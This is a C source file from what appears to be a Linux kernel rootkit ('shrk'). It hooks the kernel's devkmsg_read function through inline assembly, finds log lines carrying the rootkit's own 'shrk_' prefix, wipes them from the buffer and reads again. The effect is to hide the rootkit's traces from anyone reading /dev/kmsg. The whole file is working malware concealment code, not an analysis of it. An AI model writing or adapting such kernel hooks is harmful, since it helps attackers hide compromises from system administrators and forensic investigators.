#include "../inc/hooks.h"
#include "../inc/util.h"

#include <linux/slab.h>

char  *_devkmsg_prefix      = "shrk_" SHRK_CLIENT_ID;
size_t _devkmsg_prefix_size = 0;
void  *_devkmsg_read        = NULL;

asmlinkage ssize_t h_devkmsg_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {
  char   *kern_buf = NULL;
  int64_t ret      = 0;
  size_t  i        = 0;

  hfind(_devkmsg_read, "devkmsg_read");

  if (_devkmsg_prefix_size == 0)
    _devkmsg_prefix_size = strlen(_devkmsg_prefix);

read:
  asm("mov %1, %%r15;"
      "mov %2, %%rdi;"
      "mov %3, %%rsi;"
      "mov %4, %%rdx;"
      "mov %5, %%r10;"
      "call *%6;"
      "mov %%rax, %0"
      : "=m"(ret)
      : "i"(SHRK_MAGIC_R15), "r"(file), "r"(buf), "r"(count), "r"(ppos), "m"(_devkmsg_read)
      : "%r15", "%rdi", "%rsi", "%rdx", "%r10", "%rax");

  if (SHRK_DEBUG || ((ssize_t)ret) <= 0)
    return (ssize_t)ret;

  if ((kern_buf = kmalloc(ret, GFP_KERNEL)) == NULL) {
    debg("failed to allocate buffer");
    goto end;
  }

  if (copy_from_user(kern_buf, buf, ret)) {
    debg("failed to copy the user buffer");
    goto end;
  }

  for (; i < ret; i++) {
    if (ret - i < _devkmsg_prefix_size)
      goto end;

    if (strncmp(kern_buf + i, _devkmsg_prefix, _devkmsg_prefix_size) != 0)
      continue;

    memset(kern_buf, 0, ret);

    if (copy_to_user(buf, kern_buf, ret)) {
      debg("failed to reset the user buffer");
      goto end;
    }

    kfree(kern_buf);
    kern_buf = NULL;

    goto read;
  }

end:
  if (kern_buf != NULL)
    kfree(kern_buf);

  return (ssize_t)ret;
}
